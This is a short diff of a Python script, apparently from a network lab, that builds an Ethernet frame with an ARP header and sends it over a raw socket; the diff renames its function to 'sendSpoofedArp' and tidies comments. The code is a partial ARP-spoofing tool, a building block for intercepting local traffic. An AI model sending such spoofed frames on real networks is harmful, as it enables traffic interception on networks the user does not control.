@@ -2,19 +2,19 @@ import struct
 import socket
 import binascii
 
-def main():
+def sendSpoofedArp():
 	rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW,
 							socket.htons(0x0003))
 	rawSocket.bind(("eth0", socket.htons(0x0003)))
 
-	source_mac = binascii.unhexlify('02:AA:BB:BB:DD:10'.replace(':', ''))
-	dest_mac = binascii.unhexlify('02:42:AC:00:00:BB'.replace(':', ''))
+	source_mac = binascii.unhexlify('02:aa:bb:cc:dd:10'.replace(':', '').upper())
+	dest_mac = binascii.unhexlify('02:42:AC:00:00:BB'.replace(':', '').upper())
 
-	source_ip = "172.16.238.30"  # sender ip address
-	dest_ip = "172.16.238.20"  # target ip address
+	source_ip = "172.16.238.30"
+	dest_ip = "172.16.238.20"
 
 	# Ethernet Header
-	protocol = 0x0806  # 0x0806 for ARP
+	protocol = 0x0806  # ARP
 	eth_hdr = struct.pack("!6s6sH", dest_mac, source_mac, protocol)
 
 	# ARP header
@@ -30,6 +30,3 @@ def main():
 
 	packet = eth_hdr + arp_hdr
 	rawSocket.send(packet)
-
-if __name__ == "__main__":
-    main()
